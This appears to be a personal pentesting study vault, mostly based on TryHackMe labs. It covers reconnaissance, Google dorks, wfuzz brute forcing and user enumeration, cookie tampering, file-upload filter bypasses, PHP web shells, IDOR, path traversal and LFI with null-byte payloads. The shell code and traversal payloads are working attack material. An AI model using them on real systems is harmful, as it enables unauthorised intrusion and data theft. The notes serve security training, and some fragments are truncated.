<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Install
- https://www.tenable.com/products/nessus/nessus-essentials
- Download `-deb`
- `sudo dpkg -i **package_file.deb**`

start the Nessus Service

	sudo systemctl start nessusd.service

web main page

	https://localhost:8834/

# mergeness
- To join nessus informs to a 1 inform
1. Put all files in a folder
2. In that folder copy the .py tool
3. Run tool

</div></div>

# OUI Enum
- [[OUI\|OUI]]
- www.macvendors.com
- https://www.wireshark.org/tools/oui-lookup.html
# Others
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



layer defense to protect the active

![Pasted image 20230810114738.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230810114738.png)

</div></div>



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Do it dependint if it's pentest or redteam operation

	Search info from users, ports, devices, services, net.

Active recognition
Complete or partial info
Start from an IP or domain
# Web
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# [[Networking/Seguridad en redes/Fundamentos de seguridad ofensiva/OWASP TOP 10 - 2017\|OWASP TOP 10 - 2017]]
# [[Pentesting Web/OWASP Top 10 - 2021\|OWASP Top 10 - 2021]]

# Content discovery
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. 
- It can be common practice to restrict certain website areas so they aren't displayed in search engine results.
- These pages may be areas such as administration portals or files meant for the website's customers.
- This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- is a small icon displayed in the browser's address bar or tab used for branding a website.
- if the website developer doesn't replace this with a custom one, this can give us a clue on what framework is in use.
# Check if exit
```shell
echo "IP_address" | grep favicon
```

- images/favicon.ico
![Pasted image 20240113174238.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240113174238.png)
```shell-session
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
```

# [[Pentesting Web/OWASP favicon database\|OWASP favicon database]]

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- file gives a list of every file the website owner wishes to be listed on a search engine.

		sitemap.xml

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Show the code
```shell
curl "IP_address"
```

check comments in the page
```shell
curl "10.10.218.235" | grep -A 1 '<!--'
```

To show the headers
```shell
curl -v "IP_address"
```
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Check header missing

	headercheck IP

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



pentest-tools.com

| **Filter**                             | **Example**                            | **Description**                                                                                                                    |
| -------------------------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| site                                   | site:tryhackme.com                     | returns results only from the specified website address                                                                            |
| site:tryhackme.com admin               | site:tryhackme.com admin               | only return results from the [tryhackme.com](http://tryhackme.com) website which contain the word admin in its content.            |
| -site:www.domain.com site:*.domain.com | -site:www.domain.com site:*.domain.com | shows us only subdomain names belonging to domain.com.                                                                             |
| inurl                                  | inurl:admin<br>inurl:wp-config.php.txt | returns results that have the specified word in the URL<br>Busca el contenido proporcionado sobre la URL. (bk of conf file of php) |
| filetype                               | filetype:pdf                           | returns results which are a particular file extension                                                                              |
| intitle                                | intitle:admin                          | returns results that contain the specified word in the title<br>Busca el contenido proporcionado sobre el título del sitio.        |
| intext                                 | intext:webpage.com                     | Busca el contenido dentro del texto del sitio.                                                                                     |
| filetype                               | filetype:txt                           | Tipo de archivo a buscar. (txt)                                                                                                    |
| "enable secret"                        | "enable secret"                        | solo busca esta palabra "enable secret"                                                                                            |
| ext                                    | ext:cfg                                | Solo busca esta extensión cfg                                                                                                      |
| -cisco.com                             | -cisco.com                             | no quiero que busque en la web cisco                                                                                               |
| `site:*.webpage.com`                   | `site:*.linux_page.org`                | Search for subdomains                                                                                                              |
# Description
- Google Dorks / Google Hacking DB
- Indexar todos los sitios web publicados en internet.
- Recaba información de cada uno de estos portales de manera recursiva basado en una serie de reglas propias de cada buscador.
- Un problema común es que los administradores con poca experiencia o de manera negligente, dejan recursos privado o confidencial disponibles los cuales pasan a formar parte de la información a las personas que realizan búsquedas.
- Los dorks son operadores para refinar las búsquedas y acotar los resultados, pueden ser usado de forma maliciosa  en busca de información expuesta públicamente por error
- Google no solo permite realizar búsqueda en textos de las páginas (intext), también URL(inurl) y en los enlaces páginas tienen (link)



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://www.wappalyzer.com/

</div></div>

## ![[Web pages to enum subdomains\|Web pages to enum subdomains]]
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS.
- The format of the S3 buckets is http(s)://**{name}.**[**s3.amazonaws.com**](http://s3.amazonaws.com/) where {name} is decided by the owner, such as 
```
http://webpage-assets.s3.amazonaws.com
```

examples:
**{name}**-assets, **{name}**-www, **{name}**-public, **{name}**-private,

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Debugger
This panel in the developer tools is intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it's called Sources.
![Pasted image 20240113164542.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240113164542.png)
If you click the line number that contains the above code, you'll notice it turns blue; you've now inserted a **breakpoint** on this line.
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



is a method for sending and receiving network data in a web application background without interfering by changing the current web page.

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Black box
- Detect errors no controled
- Insert data on head, and body
- Dics
	Seclist, rockyou(passwd)
	/usr/share/worldlist/SecLists/Discovery/Web-Content/CMS
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Directories
 ```sh
wfuzz -c --hc=403,404 -t 10 -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u webpage/FUZZ
```

| Option                                    | Description                                                  |
| ----------------------------------------- | ------------------------------------------------------------ |
| `-c`                                      | colors                                                       |
| `--hc=404,403`                            | Hide codes                                                   |
| `-t 10`                                   | 10 multithreat                                               |
| `--sc=202`                                | Show codes                                                   |
| `-w`                                      | Set dic                                                      |
| `-u`                                      | set webpage_or_IP/`FUZZ`                                     |
| `-u webpage/FUZZ.html`                    | Show .html                                                   |
| `-z list,html-txt-php webpage/FUZZ.FUZ2Z` | Show some type of files                                      |
| `-z range,1-20000 webpage.com/id_FUZZ`    | Test range of values of webpage                              |
| `--sl=216`                                | Just show responds with 216 lines                            |
| `--hl=216`                                | hide line responds with 216 lines                            |
| `--hw=456`                                | hide word amount                                             |
| `-X PUT http://example.com/FUZZ`          | petición con un método HTTP personalizado, como PUT o DELETE |

subdomains, colors `-c`, hide code 403
```shell
wfuzz -c --hc=403 -t 20 -w /usr/share/SecList/Discovery/DNS/subdomains...txt -H "Host: FUZZ.page.com" https://page.com
```
# Subdomain virtual host (subdomains)
Subdomain virtual host
```shell
wfuzz -c -w tempdic3.txt -H "Host: FUZZ.page.com" -u http://10.10.24.58  
```
```shell
wfuzz -c --hc=403 -t 20 -w /usr/share/SecList/Discovery/DNS/subdomains...txt -H "Host: FUZZ.page.com" https://page.com
```
# Username enumeration if the page show "username already exists"
```sh
wfuzz -v -c -w tempdic2.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.24.58/customers/signup -H "Referer: http://10.10.24.58/customers/signup" --ss "username already exists"
```
# Username and password brute force
```sh
wfuzz -c --hc 200 -w namesdic.txt -z file,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -X POST -d "username=FUZZ&password=FUZ2Z" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.24.58/customers/login
```

---
# Password cracker
```shell
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.161.126/login.php -d "username=FUZZ&password=FUZ2Z"
```
- `-z file,usernames.txt` loads the usernames list.
- `-z file,passwords.txt` uses the password list generated by CeWL.
- `--hs "Please enter the correct credentials"` hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
- `-u` specifies the target URL.
- `-d "username=FUZZ&password=FUZ2Z"` provides the POST data format where **FUZZ** will be replaced by usernames and **FUZ2Z** by passwords.
---


</div></div>

# [[Hacking Ético y Pentesting/gobuster\|gobuster]]
# [[Pentesting Web/ffuf\|ffuf]]
# [[Hacking Ético y Pentesting/dirb\|dirb]]
# [[Hacking Ético y Pentesting/CeWL\|CeWL]]
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



**HTTP Status Codes:**

In the previous task, you learnt that when a HTTP server responds, the first line always contains a status code informing the client of the outcome of their request and also potentially how to handle it. These status codes can be broken down into 5 different ranges:

|   |   |
|---|---|
|**100-199 - Information Response**|These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common.|
|**200-299 - Success**|This range of status codes is used to tell the client their request was successful.|
|**300-399 - Redirection**|These are used to redirect the client's request to another resource. This can be either to a different webpage or a different website altogether.|
|**400-499 - Client Errors**|Used to inform the client that there was an error with their request.|
|**500-599 - Server Errors**|This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.|

| Código | Descripción |
| ---- | ---- |
| 100 | Information error. |
| 200 | OK - La solicitud ha tenido éxito. |
| 201 | Creado - La solicitud ha tenido éxito y se ha creado un nuevo recurso. |
| 204 | Sin contenido - La solicitud ha tenido éxito, pero no hay contenido para enviar. |
| 300 | Redirect. |
| 301 - Moved Permanently | Moved Permanently - This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. |
| 302 - Found | This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. |
| 400 | Solicitud incorrecta - La solicitud no se pudo entender o procesar. |
| 401 | No autorizado - Se requiere autenticación o la autenticación ha fallado. |
| 403 | Prohibido - El servidor ha entendido la solicitud, pero se niega a cumplirla. |
| 404 | No encontrado - El recurso solicitado no se encuentra en el servidor. |
| 500 | Error interno del servidor - El servidor ha encontrado una situación inesperada. |
| 503 - Service Unavailable | This server cannot handle your request as it's either overloaded or down for maintenance. |


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



	/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
	/usr/share/wordlists/dirbuster/directory-list-1.0.txt
	/usr/share/wordlists/dirb/big.txt
	/usr/share/wordlists/dirb/common.txt
	/usr/share/wordlists/dirb/small.txt
	/usr/share/wordlists/dirb/extensions_common.txt - Useful for when fuzzing for files!

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Character bypass.
- Looks like this: `%00`
- Note: as we can download it using the url, we will need to encode this into a url encoded format.
- The Poison Null Byte will now look like this: `%2500`. Adding this and then a **.md** to the end will bypass the 403 error!
- **NOTE**: the %00 trick is fixed and **not working** with **PHP 5.3.4 and above**.

Example: Only .md and .pdf files are allowed!, use the **nullbyte** to downloadit
![](https://i.imgur.com/2qugsl5.png)

**Why does this work?** 

- A Poison Null Byte is actually a NULL terminator.
- By placing a NULL character in the string at a certain byte
- the string will tell the server to **terminate at that point**, **nulling the rest of the string**.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Técnica utilizada mediante programas para obtener información dentro del contenido de una página web
- Usualmente simulan interacción humano - sitio web
- Usualmente se utilizan los protocolos HTTP/HTTPS/HTTP2
- Some sites block some tools
## scraping with python
- use [[urllib3\|urllib3]]
- https://lorem2.com/
-  Escribiremos en un archivo el contenido de la página
- Lo leeremos y filtraremos manualmente

</div></div>


# Authentication Bypass
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Username enumeration if the page show "username already exists"
```sh
wfuzz -v -c -w tempdic2.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.24.58/customers/signup -H "Referer: http://10.10.24.58/customers/signup" --ss "username already exists"
```

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# Username and password brute force
```sh
wfuzz -c --hc 200 -w namesdic.txt -z file,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -X POST -d "username=FUZZ&password=FUZ2Z" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.24.58/customers/login
```

---

</div></div>

## [[Pentesting Web/Logic Flaw\|Logic Flaw]]
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Examining and editing the cookies set by the web server during your online session can have multiple outcomes
- such as unauthenticated access,
- access to another user's account
- elevated privileges

**Plain Text**
The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:
```
**Set-Cookie: logged_in=true; Max-Age=3600; Path=/**  
****Set-Cookie: admin=false; Max-Age=3600; Path=/****
```

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.
First, we'll start just by requesting the target page:  

Curl Request 1
```sh
curl http://MACHINE_IP/cookie-test
```

We can see we are returned a message of: **Not Logged In**
Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:  

Curl Request 2
```sh
curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
```

We are given the message: **Logged In As A User**
Finally, we'll send one last request setting both the logged_in and admin cookie to true:

Curl Request 3
```sh
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
```

This returns the result: **Logged In As An Admin** as well as a flag which you can use to answer question one.

</div></div>

# Upload vulnerabilities
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Take a look at the website as a whole. Use **Wappalyzer**(is not always 100% accurate.)
- Enumerating this **manually** would be by making a request to the website and intercepting the response with **Burpsuite**. **Headers** such as `server` or `x-powered-by` can be used to **gain information** about the server.
- looking for vectors of attack, like, for example, an upload page.
- Having found an upload page, **Looking** at the source **code** for client-side scripts to **determine** if there are any client-side **filters to bypass**.
- **Attempt** a completely **innocent file upload**. From here we would look to see how our file is accessed.
  can we **access** it directly in an uploads **folder**?
  Is it **embedded in a page** somewhere? 
  What's the naming scheme of the website?
- [[Pentesting Web/Fuzzing\|Fuzzing]] to find the uploads dir, don't forget search `.php`, `.txt`, and `.html`. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
- Having ascertained how and where our uploaded files can be accessed, **attempt a malicious file upload**, **bypassing** any **client-side filters** we found in step two.
- We would expect our upload to be stopped by a server side filter, but the error message can be useful.
Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:
- If you can successfully upload a file with a totally invalid file extension (e.g. `testingimage.invalidfileextension` `file.asdasda`)
  then the chances are that the server is using an extension _blacklist_ to filter out executable files. 
  If this upload fails then any extension filter will be operating on a whitelist.
- Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. 
  If the upload fails then you know that the server is using a magic number based filter.
- As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. 
  If the upload fails then you know that the server is filtering based on MIME types.
- Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter.
  At that point you'll know what the acceptable limit is. 
  If you're very lucky then the error message of original upload may outright tell you what the size limit is. 
  Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Remote code execution
- It's worth noting that in a [[routed application\|routed application]], this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.

index.php

	<?php
	echo "hola"
	?>

cmd.php

``` php
<?php
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"
?>
```

``` php
<?php
	echo shell_exec($_GET['cmd']);
?>
```

to check if I can exec command

	localhost/cmd.php?cmd=whoami

exec ```cd .. && pwd```

``` bash
localhost/cmd.php?cmd=cd .. %26%26 pwd 
localhost/cmd.php?cmd=cd ..; pwd
```

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- **none** of these filters are **perfect**
- they will usually be used in conjunction with each other, providing a **multi-layered filter**, thus increasing the security of the upload significantly.
- Any of these filters can all be applied client-side, server-side, or both.
- **different** frameworks and languages come with their own inherent **methods of filtering** and validating uploaded files
- E.g. until PHP major version five, it was possible to bypass an extension filter by appending a null byte
## Client-side filtering
- it's running in the user's browser
- JavaScript is pretty much ubiquitous as the client-side scripting language
- In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server.
- server-side language PHP, ASP, C#, Node.js, Python, Ruby on Rails, and a variety of others
[[Bypassing Client-Side Filtering]]
## Server-side filtering
- tends to be more difficult to bypass
- n most cases it will also be impossible to bypass the filter completely
- instead we have to form a **payload** which conforms to the filters in place, but still allows us to execute our code.
### Extension Validation
- are used (in theory) to identify the contents of a file.
- MS Windows still uses them to identify file types, although Unix based systems tend to rely on other methods
#### blacklist extensions
(i.e. have a list of extensions which are **not** allowed)
#### whitelist extensions
(i.e. have a list of extensions which **are** allowed, and reject everything else)
### File Type Filtering
- Similar to Extension validation, but more intensive
- Verify that the contents of a file are acceptable to upload.
- two types of file type validation:
#### MIME validation
- **M**ultipurpose **I**nternet **M**ail **E**xtension
- are used as an identifier for files
- originally when transfered as attachments over email, but **now** also when files are **being transferred over HTTP(S)**.
- MIME type for a file upload is **attached in the header** of the request,
![Pasted image 20240516221407.png](/img/user/Pasted%20image%2020240516221407.png)
- the MIME type for this upload was "image/jpeg"
- follow the format `<type>/<subtype>`
- MIME type for a file can be checked client-side and/or server-side;
- CSV file `text/csv`
#### Magic Number validation
- more accurate way of determining the contents of a file
- Unlike Windows, Unix systems use magic numbers for identifying files;

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



is a string of bytes at the very beginning of the file content which identify the content
https://en.wikipedia.org/wiki/List_of_file_signatures

| File Format                 | Magic Bytes             | ASCII representation |
| --------------------------- | ----------------------- | -------------------- |
| PNG image file              | 89 50 4E 47 0D 0A 1A 0A | PNG                  |
| GIF image file              | 47 49 46 38             | GIF8                 |
| Windows and DOS executables | 4D 5A                   | MZ                   |
| Linux ELF executables       | 7F 45 4C 46             | .ELF                 |
| MP3 audio file              | 49 44 33                |                      |
|                             |                         |                      |
|                             |                         |                      |
|                             |                         |                      |


</div></div>

### File Length Filtering
- used to **prevent huge files** from being uploaded to the server via an upload form
- as this can potentially starve the server of resources).
### File Name Filtering
- iles uploaded to a server should be **unique**
- Usually this would mean adding a **random** aspect to the file name
- file names should be **sanitised** on upload to ensure that they don't contain any "**bad characters**", which could potentially cause problems on the file system when uploaded
- on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading,
### File Content Filtering
- More complicated filtering systems may **scan the full contents** of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Four easy ways to bypass
1. _Turn off Javascript in your browser_
   this will work provided the site **doesn't require Javascript** in order to provide **basic functionality**.
   If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable;
   otherwise, this can be an effective way of completely bypassing the client-side filter.
2. _Intercept and modify the incoming page._
   Using **Burpsuite**, intercept the incoming web page and **strip out the Javascript** filter before it has a chance to run.
3. _Intercept and modify the file upload_.
   Where the previous method works _before_ the webpage is loaded,
   this method allows the web page to load as normal, but **intercepts the file upload after it's already passed** (and been accepted by the filter).
4. _Send the file directly to the upload point._
   Why use the webpage with the filter, when you can **send the file directly** using a tool like `curl`?
   **Posting the data directly** to the page which contains the code for handling the file upload.
   The syntax for such a command would look something like this:
   `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
   **first intercept** a successful upload (using **Burpsuite** or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

Let's assume that, once again, we have found an upload page on a website:

![](https://i.imgur.com/fI67jX0.png)

As always, we'll take a look at the source code. Here we see a basic Javascript function checking for the MIME type of uploaded files:

![](https://i.imgur.com/TrI5jQD.png)

In this instance we can see that the filter is using a _whitelist_ to exclude any MIME type that isn't `image/jpeg`.  

Our next step is to attempt a file upload -- as expected, if we choose a JPEG, the function accepts it. Anything else and the upload is rejected.

Having established this, let's start [Burpsuite](https://blog.tryhackme.com/setting-up-burp/) and reload the page. We will see our own request to the site, but what we really want to see is the server's _response_, so right click on the intercepted data, scroll down to "Do Intercept", then select "Response to this request":

![](https://i.imgur.com/T0RjAry.png)

When we click the "Forward" button at the top of the window, we will then see the server's response to our request. Here we can delete, comment out, or otherwise break the Javascript function before it has a chance to load:  

![](https://i.imgur.com/ACgWLpH.png)

Having deleted the function, we once again click "Forward" until the site has finished loading, and are now free to upload any kind of file to the website:

![](https://i.imgur.com/5cyqjqa.png)

Once again we'll activate our Burpsuite intercept, then click "Upload" and catch the request:

![](https://i.imgur.com/h2164Li.png)

Observe that the MIME type of our PHP shell is currently `image/jpeg`. We'll change this to `text/x-php`, and the file extension from `.jpg` to `.php`, then forward the request to the server:

![](https://i.imgur.com/sqmwssT.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- you _can't_ see or manipulate the code
- In the real world we wouldn't be able to see the code for this
- This is the really important point to **take away from this task**: there are a **million different ways** to implement the same feature when it comes to programming
### example 1
```php
<?php
    //Get the extension
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
    //Check the extension against the blacklist -- .php and .phtml
    switch($extension){
        case "php":
        case "phtml":
        case NULL:
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }
?>
```
- In this instance, the code is looking for the last period (`.`)
- Other ways: 
	- searching for the first period in the file name
	- splitting the file name at each period and checking to see if any blacklisted extensions show up.
- the code is **filtering out** the `.php` and `.phtml` extensions
	- Alternatives `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.php-s`, `.pht` and `.phar`
	- This is actually the default for Apache2 servers
### example 2
```
ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
IF STRING ".jpg" IS IN VARIABLE userInput:
    SAVE THE FILE
ELSE:
    RETURN ERROR MESSAGE
```
- Let's try uploading a file called `shell.jpg.php`. We already know that JPEG files are accepted, so what if the filter is just checking to see if the `.jpg` file extension is somewhere within the in

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- can be very effective against a PHP based webserver;
- it can sometimes fail against other types of webserver (hint hint).

 Example with gif
`47 49 46 38 37 61`|`GIF87a`  
`47 49 46 38 39 61`|`GIF89a`
Use hexeditor
```sh
hexeditor file
```
```
00000000  47 49 46 38  37 61 0A 3C   3F 70 68 70  0A 2F 2F 20               GIF87a.<?php.//
00000010  70 68 70 2D  72 65 76 65 
```

Text editor, write something or directly the name
```php
GIF87a
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
```

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



is a string of bytes at the very beginning of the file content which identify the content
https://en.wikipedia.org/wiki/List_of_file_signatures

| File Format                 | Magic Bytes             | ASCII representation |
| --------------------------- | ----------------------- | -------------------- |
| PNG image file              | 89 50 4E 47 0D 0A 1A 0A | PNG                  |
| GIF image file              | 47 49 46 38             | GIF8                 |
| Windows and DOS executables | 4D 5A                   | MZ                   |
| Linux ELF executables       | 7F 45 4C 46             | .ELF                 |
| MP3 audio file              | 49 44 33                |                      |
|                             |                         |                      |
|                             |                         |                      |
|                             |                         |                      |


</div></div>


</div></div>


# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Insecure Direct Object References Vulnerability
- when a web server receives user-supplied input to retrieve objects (files, data, documents)
- too much trust has been placed on the input data
- and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.
- an attacker can access information or perform actions not intended for them.
- This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server.
---
Let’s say that the user has permission to access a photo named `IMG_1003.JPG`. We might guess that there are also `IMG_1002.JPG` and `IMG_1004.JPG`
- `https://store.tryhackme.thm/customers/user?id=16` 
- `007.txt`, the attacker might try other numbers such as `001.txt`, `006.txt`, and `008.txt`
---
- Imagine you've just signed up for an online service, and you want to change your profile information.
- The link you click on goes to http://online-service.thm/profile?user_id=1305, and you can see your information.
- Curiosity gets the better of you, and you try changing the user_id value to 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can now see another user's information.
---
![Pasted image 20240115172344.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240115172344.png)

---
## **Where are they located?**

The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file. 

Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to **/user/details** displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called **user_id** that you can use to display other users' information, for example, **/user/details?user_id=123**.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it.
- Encoding ensures that the receiving web server will be able to understand the contents.
- Encoding changes binary data into an ASCII string commonly using the `a-z, A-Z, 0-9 and =` character for padding.
- The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot.
- You can use websites like [https://www.base64decode.org/](https://www.base64decode.org/) to decode the string, then edit the data and re-encode it again using [https://www.base64encode.org/](https://www.base64encode.org/) and then resubmit the web request to see if there is a change in the response.
![Pasted image 20240115162246.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240115162246.png)


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Hashed IDs are a little bit more complicated to deal with than encoded ones
- but they may follow a predictable pattern, such as being the hashed version of the integer value.
- For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.

It's worthwhile putting any discovered hashes through a web service such as [https://crackstation.net/](https://crackstation.net/) (which has a database of billions of hash to value results) to see if we can find any matches.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- create two accounts and swap the Id numbers between them.
- If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.

</div></div>



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters.
- Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input.
- The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them.
- When the input is not validated, the user can pass any input to the function, causing the vulnerability.
![Pasted image 20240115173455.png](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240115173455.png)

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- **Directory Traversal**
- web security vulnerability
- allows an attacker to **read** operating system **resources**
- **manipulating** and **abusing** the web application's **URL**
- **locate** and **access files** or **directories** stored outside the application's root directory.
- Occur when the user's **input** is passed to a **function** such as **file_get_contents** in **PHP**
- Often **poor** input **validation** or **filtering** is the **cause** of the vulnerability.
- Use the **file_get_contents** to **read** the **content** of a **file**

Example
![Pasted image 20240706094637.png|900](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240706094637.png)
# dot-dot-slash attack
```
http://webapp.thm/get.php?file=../../../../etc/passwd
```
![Pasted image 20240706094844.png|500](/img/user/Pentesting%20Web/attachments/Pasted%20image%2020240706094844.png)
# Check ![[Important files\|Important files]]



</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- **L**ocal **F**ile **I**nclusion
- Access to file usually not accessible
- A fuzzer is useful
- Occurs on PHP, ASP, JSP, or even in Node.js apps.
- **Developers**' lack of **security awareness**. using functions such as include, require, include_once, and require_once often contribute to **vulnerable** web applications.
- Same concepts as [[Pentesting Web/Path Traversal\|path traversal]].
- Extract info: Users, proccess, groups
![Pasted image 20240417200528.png](/img/user/Pasted%20image%2020240417200528.png)
# Examples
## Example1
Suppose the web application provides two languages, and the user can select between the EN and AR
```php
<?PHP 
	include($_GET["lang"]);
?>
```
- Uses a **GET** request via the URL parameter **lang** to include the file of the page.
- The call can be done by sending the following HTTP request as follows: 
  `http://webapp.thm/index.php?lang=EN.php` to load the English page or `http://webapp.thm/index.php?lang=AR.php`
- `EN.php` and `AR.php` files exist in the same directory.
- `http://webapp.thm/index.php?lang=EN.php?file=/etc/passwd`
## Example 2
`http://webapp.thm/index.php?lang=EN`
If we enter an invalid input, such as THM Error:
We need to avoid the `php`extension
```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
The function looks like:  include(languages/THM.php);.
Trying `http://webapp.thm/index.php?lang=../../../../etc/passwd`
```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
###  [[Poison Null Byte\|Poison Null Byte]]
Using it
`http://webapp.thm/lab3.php?file=../../../../../etc/passwd%00`
`include("languages/../../../../../etc/passwd%00").".php");` which equivalent to `include("languages/../../../../../etc/passwd");`
### Bypass filter keywords
Now the site has a filter keywords like `sensitive files are now allowed`
####  [[Poison Null Byte\|Poison Null Byte]]
`http://webapp.thm/lab3.php?file=../../../../../etc/passwd%00`
#### Try `/.`
